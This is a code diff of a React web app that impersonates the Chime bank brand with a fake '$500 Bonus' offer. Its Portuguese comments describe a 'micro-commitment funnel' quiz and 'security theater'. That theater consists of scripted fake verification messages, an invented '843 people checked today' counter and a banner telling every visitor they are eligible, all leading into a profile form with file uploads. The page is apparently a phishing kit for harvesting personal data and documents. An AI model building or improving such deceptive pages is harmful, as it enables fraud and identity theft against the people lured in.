@@ -72,6 +72,7 @@ export default function App() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [uploadStatus, setUploadStatus] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
+  const [selectedOption, setSelectedOption] = useState<number | null>(null); // Estado para controlar o botão clicado
 
   // Perguntas para aquecer o usuário (Funil de Micro-comprometimento)
   const quizQuestions = [
@@ -90,22 +91,28 @@ export default function App() {
     return () => unsubscribe();
   }, []);
 
-  const handleQuizAnswer = () => {
-    if (quizIndex < quizQuestions.length - 1) {
-      setQuizIndex(quizIndex + 1);
-    } else {
-      // Finalizou o quiz, começa o "Teatro de Segurança"
-      setStep(0.5);
-      
-      // Sequência de mensagens para parecer um sistema real verificando
-      setTimeout(() => setLoadingText("Checking regional availability..."), 1000);
-      setTimeout(() => setLoadingText("Validating IP address..."), 2000);
-      setTimeout(() => setLoadingText("Confirming eligibility for $500 Bonus..."), 3000);
-      
-      setTimeout(() => {
-        setStep(1); // Vai para o form após 4 segundos
-      }, 4000);
-    }
+  const handleQuizAnswer = (idx: number) => {
+    setSelectedOption(idx); // Marca qual opção foi clicada
+    
+    // Pequeno delay para mostrar o feedback visual antes de mudar a pergunta
+    setTimeout(() => {
+        setSelectedOption(null); // Reseta a seleção
+        if (quizIndex < quizQuestions.length - 1) {
+          setQuizIndex(quizIndex + 1);
+        } else {
+          // Finalizou o quiz, começa o "Teatro de Segurança"
+          setStep(0.5);
+          
+          // Sequência de mensagens para parecer um sistema real verificando
+          setTimeout(() => setLoadingText("Checking regional availability..."), 1000);
+          setTimeout(() => setLoadingText("Validating IP address..."), 2000);
+          setTimeout(() => setLoadingText("Confirming eligibility for $500 Bonus..."), 3000);
+          
+          setTimeout(() => {
+            setStep(1); // Vai para o form após 4 segundos
+          }, 4000);
+        }
+    }, 300); // 300ms de delay
   };
 
   const handleFileChange = (fieldId: keyof FormDataState, file: File) => setFormData(prev => ({ ...prev, [fieldId]: file }));
@@ -170,7 +177,7 @@ export default function App() {
 
   // --- STEP 0.5: LOADING ANIMATION (TEATRO DE SEGURANÇA) ---
   if (step === 0.5) return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-center font-sans">
+    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-center font-sans w-full">
       <div className="mb-8 relative">
         <div className="absolute inset-0 bg-green-100 rounded-full animate-ping opacity-25"></div>
         <Loader2 className="w-16 h-16 text-[#00C865] animate-spin relative z-10" />
@@ -182,54 +189,60 @@ export default function App() {
 
   // --- STEP 0: QUIZ / WARM UP ---
   if (step === 0) return (
-    <div className="min-h-screen bg-[#F2F8F5] font-sans">
-       <nav className="bg-white py-4 px-6 shadow-sm relative z-20 flex justify-center">
+    <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
+       <nav className="bg-white py-4 px-6 shadow-sm relative z-20 flex justify-center w-full">
         <div className="text-3xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
       </nav>
       
-      <div className="max-w-md mx-auto px-6 pt-12 text-center">
-        <div className="mb-8 animate-fade-in-up">
-           <span className="bg-green-100 text-green-800 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 inline-block">Limited Time Offer</span>
-           <h1 className="text-4xl font-bold text-gray-900 mb-4 leading-tight">
-             Check if you qualify for the <span className="text-[#00C865] underline">$500 Bonus</span>
-           </h1>
-           <p className="text-gray-600">Answer 3 simple questions to see if you are eligible for the Chime Sign-up Bonus. Takes less than 30 seconds.</p>
-        </div>
+      <div className="flex-grow flex items-center justify-center py-12 px-6 w-full">
+        <div className="max-w-md w-full text-center">
+            <div className="mb-8 animate-fade-in-up">
+            <span className="bg-green-100 text-green-800 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 inline-block">Limited Time Offer</span>
+            <h1 className="text-4xl font-bold text-gray-900 mb-4 leading-tight">
+                Check if you qualify for the <span className="text-[#00C865] underline">$500 Bonus</span>
+            </h1>
+            <p className="text-gray-600">Answer 3 simple questions to see if you are eligible for the Chime Sign-up Bonus. Takes less than 30 seconds.</p>
+            </div>
 
-        <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all hover:shadow-2xl">
-           {/* Barra de Progresso */}
-           <div className="w-full bg-gray-100 h-2 rounded-full mb-8">
-              <div 
-                className="bg-[#00C865] h-2 rounded-full transition-all duration-500" 
-                style={{ width: `${((quizIndex + 1) / quizQuestions.length) * 100}%` }}
-              ></div>
-           </div>
+            <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all hover:shadow-2xl">
+            {/* Barra de Progresso */}
+            <div className="w-full bg-gray-100 h-2 rounded-full mb-8">
+                <div 
+                    className="bg-[#00C865] h-2 rounded-full transition-all duration-500" 
+                    style={{ width: `${((quizIndex + 1) / quizQuestions.length) * 100}%` }}
+                ></div>
+            </div>
 
-           <h2 className="text-xl font-bold text-gray-800 mb-6 min-h-[60px] flex items-center justify-center">
-             {quizQuestions[quizIndex].question}
-           </h2>
+            <h2 className="text-xl font-bold text-gray-800 mb-6 min-h-[60px] flex items-center justify-center">
+                {quizQuestions[quizIndex].question}
+            </h2>
 
-           <div className="space-y-3">
-             {quizQuestions[quizIndex].options.map((option, idx) => (
-               <button
-                 key={idx}
-                 onClick={handleQuizAnswer}
-                 className="w-full py-4 px-6 text-left rounded-xl border-2 border-gray-100 hover:border-[#00C865] hover:bg-green-50 text-gray-700 font-bold transition-all flex justify-between items-center group"
-               >
-                 {option}
-                 <ArrowRight className="w-5 h-5 text-gray-300 group-hover:text-[#00C865]" />
-               </button>
-             ))}
-           </div>
-        </div>
-        
-        <div className="mt-8 flex items-center justify-center space-x-2 text-gray-400 text-sm">
-           <div className="flex -space-x-2">
-              <div className="w-8 h-8 rounded-full bg-gray-300 border-2 border-white"></div>
-              <div className="w-8 h-8 rounded-full bg-gray-400 border-2 border-white"></div>
-              <div className="w-8 h-8 rounded-full bg-gray-500 border-2 border-white"></div>
-           </div>
-           <span>843 people checked today</span>
+            <div className="space-y-3">
+                {quizQuestions[quizIndex].options.map((option, idx) => (
+                <button
+                    key={idx}
+                    onClick={() => handleQuizAnswer(idx)}
+                    className={`w-full py-4 px-6 text-left rounded-xl border-2 transition-all flex justify-between items-center group
+                        ${selectedOption === idx 
+                            ? 'border-[#00C865] bg-green-50 text-[#00C865]' 
+                            : 'border-gray-100 hover:border-[#00C865] hover:bg-green-50 text-gray-700'
+                        } font-bold`}
+                >
+                    {option}
+                    <ArrowRight className={`w-5 h-5 transition-colors ${selectedOption === idx ? 'text-[#00C865]' : 'text-gray-300 group-hover:text-[#00C865]'}`} />
+                </button>
+                ))}
+            </div>
+            </div>
+            
+            <div className="mt-8 flex items-center justify-center space-x-2 text-gray-400 text-sm">
+            <div className="flex -space-x-2">
+                <div className="w-8 h-8 rounded-full bg-gray-300 border-2 border-white"></div>
+                <div className="w-8 h-8 rounded-full bg-gray-400 border-2 border-white"></div>
+                <div className="w-8 h-8 rounded-full bg-gray-500 border-2 border-white"></div>
+            </div>
+            <span>843 people checked today</span>
+            </div>
         </div>
       </div>
     </div>
@@ -237,7 +250,7 @@ export default function App() {
 
   // --- STEP 2: RECEIPT ---
   if (step === 2 && submittedData) return (
-    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans">
+    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans w-full">
       <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
         <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"><Check className="w-10 h-10 text-[#00C865]" strokeWidth={3} /></div>
         <h2 className="text-2xl font-bold text-gray-900 mb-2">Application Received!</h2>
@@ -262,8 +275,8 @@ export default function App() {
 
   // --- STEP 1: FORMULÁRIO (Agora com aviso de Elegibilidade) ---
   return (
-    <div className="min-h-screen bg-gray-50 font-sans">
-      <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20">
+    <div className="min-h-screen bg-gray-50 font-sans w-full">
+      <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20 w-full">
         <div className="text-2xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
         <div className="hidden md:flex space-x-6 text-sm font-semibold text-gray-600">
           <span className="text-green-600 font-bold flex items-center"><Star className="w-4 h-4 mr-1 fill-current"/> Offer Activated</span>
@@ -272,16 +285,16 @@ export default function App() {
       </nav>
       
       {/* Aviso de Elegibilidade */}
-      <div className="bg-green-600 text-white text-center py-2 text-sm font-bold animate-pulse shadow-md relative z-10">
+      <div className="bg-green-600 text-white text-center py-2 text-sm font-bold animate-pulse shadow-md relative z-10 w-full">
          🎉 Congratulations! You are eligible for the $500 Bonus.
       </div>
 
-      <div className="bg-[#004F2D] text-white pt-8 pb-24 px-6 text-center relative">
+      <div className="bg-[#004F2D] text-white pt-8 pb-24 px-6 text-center relative w-full">
           <h1 className="text-3xl md:text-4xl font-bold mb-2">Complete your profile</h1>
           <p className="text-green-100 opacity-90">Final step to unlock your account and claim bonus.</p>
       </div>
 
-      <div className="px-4 -mt-16 pb-20 relative z-10">
+      <div className="px-4 -mt-16 pb-20 relative z-10 w-full">
         <div className="max-w-lg mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
           <div className="bg-gray-50 p-6 border-b border-gray-100">
             <div className="flex items-center space-x-2 text-sm text-gray-500 mb-1">
